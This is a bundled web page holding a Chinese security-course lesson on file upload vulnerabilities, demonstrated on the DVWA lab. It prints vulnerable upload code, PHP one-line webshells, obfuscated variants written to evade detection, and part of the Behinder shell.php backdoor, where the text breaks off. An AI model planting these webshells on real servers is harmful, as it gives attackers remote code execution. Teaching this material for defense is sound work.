import{_ as s,o as a,g as n,Q as p}from"./chunks/framework.f949202b.js";const u=JSON.parse('{"title":"漏洞成因 ","description":"","frontmatter":{},"headers":[],"relativePath":"posts/frontEnd/Web 安全攻防之道_文档/(5981) 13  文件上传漏洞：种植服务器木马的捷径.md","filePath":"posts/frontEnd/Web 安全攻防之道_文档/(5981) 13  文件上传漏洞：种植服务器木马的捷径.md","lastUpdated":null}'),l={name:"posts/frontEnd/Web 安全攻防之道_文档/(5981) 13  文件上传漏洞：种植服务器木马的捷径.md"},o=p(`<p>上一讲介绍过反序列化漏洞，利用漏洞常可以造成执行代码的严重后果。</p><p>从本讲开始将介绍文件上传漏洞，它比反序列化漏洞原理与利用更加简单，但同样可以达到控制服务器的严重后果，不少攻击者会通过此类漏洞向服务器种植木马，以获取服务器的控制权限。</p><p>下面我们就详细介绍下文件上传漏洞的原理、利用方法、绕过限制、检测与防御。</p><h3 id="漏洞成因" tabindex="-1">漏洞成因 <a class="header-anchor" href="#漏洞成因" aria-label="Permalink to &quot;漏洞成因&quot;">​</a></h3><p>文件上传漏洞正是在文件上传功能中，由于对用户上传的文件数据未做有效检测或过滤不严，导致上传的恶意文件被服务端解释器解析执行，利用漏洞可获取系统控制权。</p><p>很多网站都有一些文件上传功能，常见的是图片、视频、压缩文档上传，如果网站是 PHP 写的，那么上传 PHP 到服务器就有可能被解析，若服务器支持其他语言的解析执行，比如 ASP、JSP、ASPX 等文件也可达到同等攻击效果，达到恶意代码执行。</p><p>以 DVWA 靶场的文件上传漏洞为例：</p><p><img src="https://s0.lgstatic.com/i/image2/M01/09/6B/Cip5yGAOpPiAMkOEAAVBpkJSo30732.png" alt="图片1.png"><br> 图 1 DVWA File Upload</p><p>对应的漏洞代码如下，通过 POST 请求将文件上传到&quot;网站根目录 /hackable/uploads/&quot;目录：</p><div class="language-php vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">( </span><span style="color:#79B8FF;">isset</span><span style="color:#E1E4E8;">( $_POST[ </span><span style="color:#9ECBFF;">&#39;Upload&#39;</span><span style="color:#E1E4E8;"> ] ) ) {</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// Where are we going to be writing to?</span></span>
<span class="line"><span style="color:#E1E4E8;">    $target_path  </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">DVWA_WEB_PAGE_TO_ROOT</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;hackable/uploads/&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">    $target_path </span><span style="color:#F97583;">.=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">basename</span><span style="color:#E1E4E8;">( $_FILES[ </span><span style="color:#9ECBFF;">&#39;uploaded&#39;</span><span style="color:#E1E4E8;"> ][ </span><span style="color:#9ECBFF;">&#39;name&#39;</span><span style="color:#E1E4E8;"> ] );</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// Can we move the file to the upload folder?</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">( </span><span style="color:#F97583;">!</span><span style="color:#79B8FF;">move_uploaded_file</span><span style="color:#E1E4E8;">( $_FILES[ </span><span style="color:#9ECBFF;">&#39;uploaded&#39;</span><span style="color:#E1E4E8;"> ][ </span><span style="color:#9ECBFF;">&#39;tmp_name&#39;</span><span style="color:#E1E4E8;"> ], $target_path ) ) {</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#6A737D;">// No</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">else</span><span style="color:#E1E4E8;"> {</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#6A737D;">// Yes!</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&lt;pre&gt;{</span><span style="color:#E1E4E8;">$target_path</span><span style="color:#9ECBFF;">} succesfully uploaded!&lt;/pre&gt;&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">    }</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;">( </span><span style="color:#005CC5;">isset</span><span style="color:#24292E;">( $_POST[ </span><span style="color:#032F62;">&#39;Upload&#39;</span><span style="color:#24292E;"> ] ) ) {</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// Where are we going to be writing to?</span></span>
<span class="line"><span style="color:#24292E;">    $target_path  </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">DVWA_WEB_PAGE_TO_ROOT</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">.</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;hackable/uploads/&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">    $target_path </span><span style="color:#D73A49;">.=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">basename</span><span style="color:#24292E;">( $_FILES[ </span><span style="color:#032F62;">&#39;uploaded&#39;</span><span style="color:#24292E;"> ][ </span><span style="color:#032F62;">&#39;name&#39;</span><span style="color:#24292E;"> ] );</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// Can we move the file to the upload folder?</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">if</span><span style="color:#24292E;">( </span><span style="color:#D73A49;">!</span><span style="color:#005CC5;">move_uploaded_file</span><span style="color:#24292E;">( $_FILES[ </span><span style="color:#032F62;">&#39;uploaded&#39;</span><span style="color:#24292E;"> ][ </span><span style="color:#032F62;">&#39;tmp_name&#39;</span><span style="color:#24292E;"> ], $target_path ) ) {</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6A737D;">// No</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">else</span><span style="color:#24292E;"> {</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6A737D;">// Yes!</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&lt;pre&gt;{</span><span style="color:#24292E;">$target_path</span><span style="color:#032F62;">} succesfully uploaded!&lt;/pre&gt;&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">    }</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>中间没有任何限制，也就是说上传 PHP 文件也可以，简单写个包含 phpinfo() 的 php 文件：</p><div class="language-php vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">phpinfo</span><span style="color:#E1E4E8;">(); </span><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">phpinfo</span><span style="color:#24292E;">(); </span><span style="color:#D73A49;">?&gt;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>上传后有路径提示：</p><p><img src="https://s0.lgstatic.com/i/image2/M01/09/6B/Cip5yGAOpQyAZX8VAAIOqsWIghc896.png" alt="图片2.png"><br> 图 2 上传 PHP 成功</p><p>访问地址：<a href="http://127.0.0.1/hackable/uploads/phpinfo.php" target="_blank" rel="noreferrer">http://127.0.0.1/hackable/uploads/phpinfo.php</a>，可以看到 phpinfo() 已经被执行成功。</p><p><img src="https://s0.lgstatic.com/i/image/M00/91/7B/Ciqc1GAOpSaARCD_AALlCWvyDKc931.png" alt="图片3.png"><br> 图 3 解析成功的 phpinfo</p><p>就如果我们上传的 PHP 是更多恶意功能的脚本，就可以实现更多攻击行为。</p><h3 id="利用漏洞上传-webshell" tabindex="-1">利用漏洞上传 Webshell <a class="header-anchor" href="#利用漏洞上传-webshell" aria-label="Permalink to &quot;利用漏洞上传 Webshell&quot;">​</a></h3><h4 id="_1-一句话木马" tabindex="-1">1.一句话木马 <a class="header-anchor" href="#_1-一句话木马" aria-label="Permalink to &quot;1.一句话木马&quot;">​</a></h4><p>提到 Webshell 木马，就不得不提下&quot;一句话木马&quot;。PHP 一句话木马可以通过 GET、POST、COOKIE 这几种方式提交数据，然后将数据传递给代码/命令执行函数，从而实现任意代码/命令执行。</p><p>比如以下这个一句话木马：</p><div class="language-php vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">eval</span><span style="color:#E1E4E8;">(</span><span style="color:#F97583;">@</span><span style="color:#E1E4E8;">$_GET[</span><span style="color:#9ECBFF;">&#39;a&#39;</span><span style="color:#E1E4E8;">]); </span><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">eval</span><span style="color:#24292E;">(</span><span style="color:#D73A49;">@</span><span style="color:#24292E;">$_GET[</span><span style="color:#032F62;">&#39;a&#39;</span><span style="color:#24292E;">]); </span><span style="color:#D73A49;">?&gt;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>将上述代码保存为 eval.php 并上传至网站，然后构造请求：</p><div class="language-java vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//127.0.0.1/hackable/uploads/eval.php?a=phpinfo();</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//127.0.0.1/hackable/uploads/eval.php?a=phpinfo();</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>利用一句话木马成功执行 phpinfo() 函数。</p><p><img src="https://s0.lgstatic.com/i/image/M00/91/86/CgqCHmAOpTmAfY3IAARME2KRqaY914.png" alt="图片4.png"><br> 图 4 利用一句话木马执行代码</p><p>有时为了绕过木马检测，攻击者会对一句话进行混淆变形，比如下面几句。</p><ul><li><strong>利用字符串拼接执行函数名：</strong></li></ul><div class="language-php vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#E1E4E8;">$a</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;e&quot;</span><span style="color:#F97583;">.</span><span style="color:#9ECBFF;">&quot;v&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">$b</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;a&quot;</span><span style="color:#F97583;">.</span><span style="color:#9ECBFF;">&quot;l&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">$c</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$a</span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;">$b;</span></span>
<span class="line"><span style="color:#E1E4E8;">$c($_POST[</span><span style="color:#9ECBFF;">&#39;a&#39;</span><span style="color:#E1E4E8;">]);</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#24292E;">$a</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;e&quot;</span><span style="color:#D73A49;">.</span><span style="color:#032F62;">&quot;v&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">$b</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;a&quot;</span><span style="color:#D73A49;">.</span><span style="color:#032F62;">&quot;l&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">$c</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$a</span><span style="color:#D73A49;">.</span><span style="color:#24292E;">$b;</span></span>
<span class="line"><span style="color:#24292E;">$c($_POST[</span><span style="color:#032F62;">&#39;a&#39;</span><span style="color:#24292E;">]);</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><ul><li><strong>通过 base64_decode 编码执行函数名：</strong></li></ul><div class="language-php vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#E1E4E8;">$a</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">base64_decode</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;ZXZhbA==&quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">$a($_POST[</span><span style="color:#9ECBFF;">&#39;a&#39;</span><span style="color:#E1E4E8;">]);</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#24292E;">$a</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">base64_decode</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;ZXZhbA==&quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">$a($_POST[</span><span style="color:#032F62;">&#39;a&#39;</span><span style="color:#24292E;">]);</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ul><li><strong>由 GET 参数指定函数名和参数：</strong></li></ul><div class="language-php vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span><span style="color:#E1E4E8;"> $_GET[</span><span style="color:#9ECBFF;">&#39;a&#39;</span><span style="color:#E1E4E8;">]($_GET[</span><span style="color:#9ECBFF;">&#39;b&#39;</span><span style="color:#E1E4E8;">]);  </span><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span><span style="color:#24292E;"> $_GET[</span><span style="color:#032F62;">&#39;a&#39;</span><span style="color:#24292E;">]($_GET[</span><span style="color:#032F62;">&#39;b&#39;</span><span style="color:#24292E;">]);  </span><span style="color:#D73A49;">?&gt;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>行业内常称&quot;一句话木马&quot;为&quot;小马&quot;，用它来传递&quot;大马&quot;，因为&quot;大马&quot;比较容易被检测到。</p><h4 id="_2-webshell-管理工具" tabindex="-1">2.Webshell 管理工具 <a class="header-anchor" href="#_2-webshell-管理工具" aria-label="Permalink to &quot;2.Webshell 管理工具&quot;">​</a></h4><p>攻击者常用&quot;菜刀&quot;&quot;冰蝎&quot;&quot;蚁剑&quot;、Weevely、Cknife 这些 Webshell 工具去连接一句话木马，其中尤以&quot;菜刀&quot;最为出名。</p><p>由于原版&quot;菜刀&quot;只支持 Windows，因此我这边选用支持跨平台的&quot;冰蝎&quot;作为演示，可进入 <a href="https://github.com/rebeyond/Behinder/releases" target="_blank" rel="noreferrer">Github</a> 对&quot;冰蝎&quot;进行下载。</p><p>下载解压后的目录：</p><div class="language-java vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">$ tree</span></span>
<span class="line"><span style="color:#E1E4E8;">.</span></span>
<span class="line"><span style="color:#E1E4E8;">├── 更新日志.txt</span></span>
<span class="line"><span style="color:#E1E4E8;">├── Behinder_v3.</span><span style="color:#FDAEB7;font-style:italic;">0_Beta6_linux</span><span style="color:#E1E4E8;">.jar</span></span>
<span class="line"><span style="color:#E1E4E8;">├── data.db</span></span>
<span class="line"><span style="color:#E1E4E8;">└── server</span></span>
<span class="line"><span style="color:#E1E4E8;">    ├── shell.asp</span></span>
<span class="line"><span style="color:#E1E4E8;">    ├── shell.aspx</span></span>
<span class="line"><span style="color:#E1E4E8;">    ├── shell.jsp</span></span>
<span class="line"><span style="color:#E1E4E8;">    ├── shell.jspx.jsp</span></span>
<span class="line"><span style="color:#E1E4E8;">    └── shell.php</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">$ tree</span></span>
<span class="line"><span style="color:#24292E;">.</span></span>
<span class="line"><span style="color:#24292E;">├── 更新日志.txt</span></span>
<span class="line"><span style="color:#24292E;">├── Behinder_v3.</span><span style="color:#B31D28;font-style:italic;">0_Beta6_linux</span><span style="color:#24292E;">.jar</span></span>
<span class="line"><span style="color:#24292E;">├── data.db</span></span>
<span class="line"><span style="color:#24292E;">└── server</span></span>
<span class="line"><span style="color:#24292E;">    ├── shell.asp</span></span>
<span class="line"><span style="color:#24292E;">    ├── shell.aspx</span></span>
<span class="line"><span style="color:#24292E;">    ├── shell.jsp</span></span>
<span class="line"><span style="color:#24292E;">    ├── shell.jspx.jsp</span></span>
<span class="line"><span style="color:#24292E;">    └── shell.php</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>server 目录就是用来上传服务端的小马，我们选择上传 shell.php，默认使用连接密码 rebeyond，你可根据需要自行修改，然后用密码 32 位 md5 哈希值替换 key 变量即可。</p><p>shell.php 代码如下：</p><div class="language-php vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#F97583;">@</span><span style="color:#79B8FF;">error_reporting</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#79B8FF;">session_start</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">    $key</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;e45e329feb5d925b&quot;</span><span style="color:#E1E4E8;">; </span><span style="color:#6A737D;">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span>
<span class="line"><span style="color:#E1E4E8;">	$_SESSION[</span><span style="color:#9ECBFF;">&#39;k&#39;</span><span style="color:#E1E4E8;">]</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$key;</span></span>
<span class="line"><span style="color:#E1E4E8;">	$post</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">file_get_contents</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;php://input&quot;</span><span style="color:#E1E4E8;">);  </span><span style="color:#6A737D;">// 读取上传文件内容</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">(</span><span style="color:#F97583;">!</span><span style="color:#79B8FF;">extension_loaded</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;openssl&#39;</span><span style="color:#E1E4E8;">))</span></span>
<span class="line"><span style="color:#E1E4E8;">	{</span></span>
<span class="line"><span style="color:#E1E4E8;">		$t</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;base64_&quot;</span><span style="color:#F97583;">.</span><span style="color:#9ECBFF;">&quot;decode&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">		$post</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$t($post</span><span style="color:#F97583;">.</span><span style="color:#9ECBFF;">&quot;&quot;</span><span style="color:#E1E4E8;">);   </span><span style="color:#6A737D;">// 如果没有openssl扩展就调用base64_decode</span></span>
<span class="line"><span style="color:#E1E4E8;">		</span></span>
<span class="line"><span style="color:#E1E4E8;">		</span><span style="color:#F97583;">for</span><span style="color:#E1E4E8;">($i</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">;$i</span><span style="color:#F97583;">&lt;</span><span style="color:#79B8FF;">strlen</span><span style="color:#E1E4E8;">($post);$i</span><span style="color:#F97583;">++</span><span style="color:#E1E4E8;">) {</span></span>
<span class="line"><span style="color:#E1E4E8;">    			 $post[$i] </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> $post[$i]</span><span style="color:#F97583;">^</span><span style="color:#E1E4E8;">$key[$i</span><span style="color:#F97583;">+</span><span style="color:#79B8FF;">1</span><span style="color:#F97583;">&amp;</span><span style="color:#79B8FF;">15</span><span style="color:#E1E4E8;">]; </span></span>
<span class="line"><span style="color:#E1E4E8;">    			}</span></span>
<span class="line"><span style="color:#E1E4E8;">	}</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">else</span></span>
<span class="line"><span style="color:#E1E4E8;">	{</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#6A737D;">// 如果有openssl扩展就采用AES128位解密，因为冰蝎是加密传输的</span></span>
<span class="line"><span style="color:#E1E4E8;">		$post</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">openssl_decrypt</span><span style="color:#E1E4E8;">($post, </span><span style="color:#9ECBFF;">&quot;AES128&quot;</span><span style="color:#E1E4E8;">, $key);</span></span>
<span class="line"><span style="color:#E1E4E8;">	}</span></span>
<span class="line"><span style="color:#E1E4E8;">    $arr</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">explode</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;|&#39;</span><span style="color:#E1E4E8;">,$post);</span></span>
<span class="line"><span style="color:#E1E4E8;">    $func</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$arr[</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">];</span></span>
<span class="line"><span style="color:#E1E4E8;">    $params</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$arr[</span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">];</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">class</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">C</span><span style="color:#E1E4E8;">{</span><span style="color:#F97583;">public</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">function</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__invoke</span><span style="color:#E1E4E8;">($p) {</span><span style="color:#79B8FF;">eval</span><span style="color:#E1E4E8;">($p</span><span style="color:#F97583;">.</span><span style="color:#9ECBFF;">&quot;&quot;</span><span style="color:#E1E4E8;">);}}</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">@</span><span style="color:#79B8FF;">call_user_func</span><span style="color:#E1E4E8;">(</span><span style="color:#F97583;">new</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">C</span><span style="color:#E1E4E8;">(),$params);</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#D73A49;">@</span><span style="color:#005CC5;">error_reporting</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#005CC5;">session_start</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">    $key</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;e45e329feb5d925b&quot;</span><span style="color:#24292E;">; </span><span style="color:#6A737D;">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span>
<span class="line"><span style="color:#24292E;">	$_SESSION[</span><span style="color:#032F62;">&#39;k&#39;</span><span style="color:#24292E;">]</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$key;</span></span>
<span class="line"><span style="color:#24292E;">	$post</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">file_get_contents</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;php://input&quot;</span><span style="color:#24292E;">);  </span><span style="color:#6A737D;">// 读取上传文件内容</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">if</span><span style="color:#24292E;">(</span><span style="color:#D73A49;">!</span><span style="color:#005CC5;">extension_loaded</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;openssl&#39;</span><span style="color:#24292E;">))</span></span>
<span class="line"><span style="color:#24292E;">	{</span></span>
<span class="line"><span style="color:#24292E;">		$t</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;base64_&quot;</span><span style="color:#D73A49;">.</span><span style="color:#032F62;">&quot;decode&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">		$post</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">$t($post</span><span style="color:#D73A49;">.</span><span style="color:#032F62;">&quot;&quot;</span><span style="color:#24292E;">);   </span><span style="color:#6A737D;">// 如果没有openssl扩展就调用base64_decode</span></span>
<span class="line"><span style="color:#24292E;">		</span></span>
<span class="line"><span style="color:#24292E;">		</span><span style="color:#D73A49;">for</span><span style="color:#24292E;">($i</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">;$i</span><span style="color:#D73A49;">&lt;</span><span style="color:#005CC5;">strlen</span><span style="color:#24292E;">($post);$i</span><span style="color:#D73A49;">++</span><span style="color:#24292E;">) {</span></span>
<span class="line"><span style="color:#24292E;">    			 $post[$i] </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> $post[$i]</span><span style="color:#D73A49;">^</span><span style="color:#24292E;">$key[$i</span><span style="color:#D73A49;">+</span><span style="color:#005CC5;">1</span><span style="color:#D73A49;">&amp;</span><span style="color:#005CC5;">15</span><span style="color:#24292E;">]; </span></span>
<span class="line"><span style="color:#24292E;">    			}</span></span>
<span class="line"><span style="color:#24292E;">	}</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">else</span></span>
<span class="line"><span style="color:#24292E;">	{</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#6A737D;">// 如果有openssl扩展就采用AES128位解密，因为冰蝎是加密传输的</span></span>
<span class="line"><span style="color:#24292E;">		$post</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">openssl_decrypt</span><span style="color:#24292E;">($post, </span><span style="color:#032F62;">&quot;AES128&quot;</span><span style="color:#24292E;">, $key);</span></span>
